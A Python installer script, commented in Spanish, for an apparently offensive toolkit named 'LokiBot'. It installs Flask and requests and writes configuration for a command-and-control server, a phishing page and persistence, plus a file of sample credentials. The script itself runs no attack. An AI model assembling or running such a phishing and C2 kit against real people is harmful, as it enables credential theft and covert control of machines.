#!/usr/bin/env python3
"""
LokiBot - Script de Instalación
Instala todas las dependencias necesarias
"""

import subprocess
import sys
import os
from pathlib import Path

def print_banner():
    banner = """
    ██╗      ██████╗ ██╗  ██╗██╗██████╗  ██████╗ ████████╗
    ██║     ██╔═══██╗██║ ██╔╝██║██╔══██╗██╔═══██╗╚══██╔══╝
    ██║     ██║   ██║█████╔╝ ██║██████╔╝██║   ██║   ██║   
    ██║     ██║   ██║██╔═██╗ ██║██╔══██╗██║   ██║   ██║   
    ███████╗╚██████╔╝██║  ██╗██║██████╔╝╚██████╔╝   ██║   
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝    ╚═╝   
    
    🔧 LokiBot - Instalación de Dependencias 🔧
    """
    print(banner)

def instalar_dependencias():
    """Instala las dependencias necesarias"""
    dependencias = [
        'flask',
        'requests',
        'colorama'
    ]
    
    print("[*] Instalando dependencias de Python...")
    
    for dep in dependencias:
        try:
            print(f"[*] Instalando {dep}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', dep])
            print(f"[+] {dep} instalado correctamente")
        except subprocess.CalledProcessError as e:
            print(f"[-] Error instalando {dep}: {e}")
            return False
    
    return True

def verificar_instalacion():
    """Verifica que todas las dependencias estén instaladas"""
    print("\n[*] Verificando instalación...")
    
    modulos = ['flask', 'requests', 'platform', 'os', 'json', 'subprocess', 'winreg']
    
    for modulo in modulos:
        try:
            if modulo == 'winreg' and os.name != 'nt':
                print(f"[!] {modulo} no disponible en este sistema (solo Windows)")
                continue
            
            __import__(modulo)
            print(f"[+] {modulo} - OK")
        except ImportError:
            print(f"[-] {modulo} - ERROR")
            return False
    
    return True

def crear_archivos_configuracion():
    """Crea archivos de configuración necesarios"""
    print("\n[*] Creando archivos de configuración...")
    
    # Crear archivo de configuración
    config = {
        "servidor_c2": {
            "host": "localhost",
            "puerto": 5000
        },
        "servidor_phishing": {
            "host": "localhost",
            "puerto": 8000
        },
        "configuracion": {
            "debug": False,
            "logging": True,
            "persistencia": True
        }
    }
    
    try:
        import json
        with open('config.json', 'w') as f:
            json.dump(config, f, indent=2)
        print("[+] Archivo config.json creado")
    except Exception as e:
        print(f"[-] Error creando config.json: {e}")
    
    # Crear archivo de credenciales de ejemplo
    try:
        with open('credenciales_ejemplo.txt', 'w') as f:
            f.write("# Credenciales de ejemplo para testing\n")
            f.write("usuario@ejemplo.com:clave123\n")
            f.write("admin@facebook.com:adminpass\n")
            f.write("test@test.com:password123\n")
        print("[+] Archivo credenciales_ejemplo.txt creado")
    except Exception as e:
        print(f"[-] Error creando credenciales_ejemplo.txt: {e}")

def mostrar_instrucciones():
    """Muestra las instrucciones de uso"""
    print("\n" + "="*60)
    print("🚀 INSTALACIÓN COMPLETADA")
    print("="*60)
    
    print("\n📋 INSTRUCCIONES DE USO:")
    print("1. Abrir 3 terminales diferentes")
    print("2. En la Terminal 1: python servidor_c2.py")
    print("3. En la Terminal 2: python login.py")
    print("4. En la Terminal 3: python demo.py")
    
    print("\n🌐 ACCESO:")
    print("• Panel C2: http://localhost:5000")
    print("• Página Phishing: http://localhost:8000")
    
    print("\n📁 ARCHIVOS CREADOS:")
    print("• config.json - Configuración del sistema")
    print("• credenciales_ejemplo.txt - Credenciales de prueba")
    print("• intentos.txt - Log de intentos (se crea automáticamente)")
    
    print("\n⚠️  ADVERTENCIAS:")
    print("• Solo para uso educativo y testing")
    print("• Usar en entornos controlados")
    print("• Requiere permisos de administrador para algunas funciones")
    
    print("\n🔧 SOLUCIÓN DE PROBLEMAS:")
    print("• Si hay errores de puertos, cambiar puertos en config.json")
    print("• Si falla la persistencia, ejecutar como administrador")
    print("• Para Windows: usar PowerShell como administrador")

def main():
    print_banner()
    
    print("🔧 Iniciando instalación de LokiBot...")
    
    # Verificar Python
    if sys.version_info < (3, 6):
        print("[-] Error: Se requiere Python 3.6 o superior")
        sys.exit(1)
    
    print(f"[+] Python {sys.version} detectado")
    
    # Instalar dependencias
    if not instalar_dependencias():
        print("[-] Error en la instalación de dependencias")
        sys.exit(1)
    
    # Verificar instalación
    if not verificar_instalacion():
        print("[-] Error en la verificación de la instalación")
        sys.exit(1)
    
    # Crear archivos de configuración
    crear_archivos_configuracion()
    
    # Mostrar instrucciones
    mostrar_instrucciones()
    
    print("\n✅ ¡Instalación completada exitosamente!")

if __name__ == '__main__':
    main()
